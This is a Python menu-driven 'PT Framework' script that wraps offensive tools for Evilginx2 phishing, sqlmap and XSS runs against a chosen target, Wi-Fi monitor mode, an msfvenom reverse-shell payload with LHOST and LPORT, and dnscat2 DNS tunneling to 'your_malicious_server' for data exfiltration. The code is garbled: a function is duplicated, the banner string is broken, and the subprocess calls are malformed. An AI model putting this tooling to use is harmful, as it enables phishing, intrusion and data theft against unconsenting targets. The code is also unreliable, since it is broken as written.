import os
import subprocess
import time
import sys
import asyncio
import aiohttp
import json

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Define tool checks
def check_tool(tool_name):
    """Check if the tool is installed on the system."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

# Banner for the framework
def display_splash_screen():
    splash = """
   def display_splash_screen():
    splash = """
    
 _____________________  ___________                                                  __                  _____  ____.____   __________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|             \/               \/      |__|                 \/     
                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("PT Framework 41PH4-01\n")

# Tools and their commands
TOOLS = {
    'sqlmap': 'sqlmap --help',
    'xsstrike': 'xsstrike --help',
    'aircrack-ng': 'airmon-ng --help',
    'metasploit': 'msfvenom --help',
    'evilginx2': 'evilginx2 --help',
    'nmap': 'nmap -v',
    'nessus': 'nessus -h',
    'dnscat2': 'dnscat2 --help',
}

# Global settings
TARGET = None
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Tool checking function
def check_tools():
    missing_tools = []
    for tool, command in TOOLS.items():
        if not check_tool(tool):
            missing_tools.append(tool)
    if missing_tools:
        print(f"Warning: Missing tools: {', '.join(missing_tools)}")
    else:
        print("All tools are installed and ready!")

# Phishing Campaign with Evilginx2
def phishing_campaign():
    print("[*] Starting Phishing Campaign with Evilginx2...")
    subprocess.run(["evilginx2", "launch"])

# SQL Injection with sqlmap
def sql_injection(url):
    print(f"[*] Running SQL Injection Test on {url}")
    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])

# XSS Testing with XSStrike
def test_xss(url):
    print(f"[*] Running XSS Testing on {url}")
    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])

# Network Scanning with Nmap
def network_scan(target):
    print(f"[*] Running Network Scan on {target}")
    subprocess.run([TOOLS['nmap'], target])

# Wi-Fi Deauth Attack with aircrack-ng
def wifi_attack(interface):
    print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airodump-ng", interface])

# Metasploit Payload Generation
def metasploit_payload():
    print("[*] Generating Metasploit payload...")
    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])

# Subdomain Enumeration using custom script
async def fetch(session, url):
    """Fetch data from a URL."""
    async with session.get(url) as response:
        return await response.text()

async def get_subdomains(domain):
    """Get subdomains from public sources."""
    subdomains = set()
    urls = [
        f"https://crt.sh/?q={domain}&output=json",
        f"https://api.hackertarget.com/hostsearch/?q={domain}"
    ]

    async with aiohttp.ClientSession() as session:
        tasks = [fetch(session, url) for url in urls]
        responses = await asyncio.gather(*tasks)

        for response in responses:
            if response.startswith('['):  # JSON response from crt.sh
                json_response = json.loads(response)
                for item in json_response:
                    subdomains.add(item['name_value'])
            else:  # Plain text response from hackertarget
                lines = response.split('\n')
                for line in lines:
                    if line:
                        subdomains.add(line.split(',')[0])

    return list(subdomains)

def subdomain_enum(domain):
    """Wrapper to call the async function."""
    print(f"[*] Enumerating subdomains for {domain}...")
    subdomains = asyncio.run(get_subdomains(domain))
    print(f"Found subdomains: {subdomains}")

# Data Exfiltration with DNS Tunneling (dnscat2)
def dns_tunneling():
    print("[*] Starting DNS Tunneling for Data Exfiltration...")
    subprocess.run([TOOLS['dnscat2'], "--dns", "your_malicious_server"])

# Main driver function for the framework
def main():
    display_splash_screen()
    check_tools()

    print("[*] Welcome to the Complete Penetration Testing Framework!")
    print("[*] Please choose an option:")
    print("1. Phishing Campaign")
    print("2. SQL Injection Testing")
    print("3. XSS Testing")
    print("4. Network Scan")
    print("5. Wi-Fi Deauth Attack")
    print("6. Generate Metasploit Payload")
    print("7. Subdomain Enumeration")
    print("8. DNS Tunneling Exfiltration")

    choice = input("Enter your choice: ")

    if choice == "1":
        phishing_campaign()
    elif choice == "2":
        url = input("Enter target URL for SQLi test: ")
        sql_injection(url)
    elif choice == "3":
        url = input("Enter target URL for XSS test: ")
        test_xss(url)
    elif choice == "4":
        target_ip = input("Enter target IP for Nmap scan: ")
        network_scan(target_ip)
    elif choice == "5":
        interface = input("Enter interface for Wi-Fi deauth (e.g., wlan0): ")
        wifi_attack(interface)
    elif choice == "6":
        metasploit_payload()
    elif choice == "7":
        domain = input("Enter domain for subdomain enumeration: ")
        subdomain_enum(domain)
    elif choice == "8":
        dns_tunneling()
    else:
        print("[!] Invalid choice!")

# Run the script
if __name__ == "__main__":
    main()
